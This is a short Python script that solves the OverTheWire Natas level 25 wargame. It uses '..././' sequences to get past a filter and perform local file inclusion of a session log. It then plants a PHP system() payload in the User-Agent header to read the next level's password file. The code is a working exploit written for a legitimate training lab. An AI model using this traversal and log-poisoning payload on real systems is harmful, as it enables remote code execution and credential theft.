"""
Help script to resolve natas challenge #25
"""
import requests
import json

level = 'natas25'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we will bypass several input validations which happen to be poorly implemented.
The objective will be perform an LFI attack.
"""

session = requests.Session()
session.get(url, data={'lang': 'de'}, auth=auth)
# The occurrences of "../" will be trimmed from the request.
# We will write "..././" so that in the end we have "../" nevertheless.
data = {'lang': '..././..././..././..././..././var/www/natas/natas25/logs/natas25_' + session.cookies['PHPSESSID'] + '.log'}
# An entry in the log looks like this:
# [20.09.2019 12::42:57] python-requests/2.19.1 "Directory traversal attempt! fixing request."
# As the User-agent is written and printed as is, we might want to inject some HTML, or even PHP there.
session.headers = {'user-agent': '<?php system("cat /etc/natas_webpass/natas26") ?>'}
response = session.post(url, data=data, auth=auth)
print(response.text)
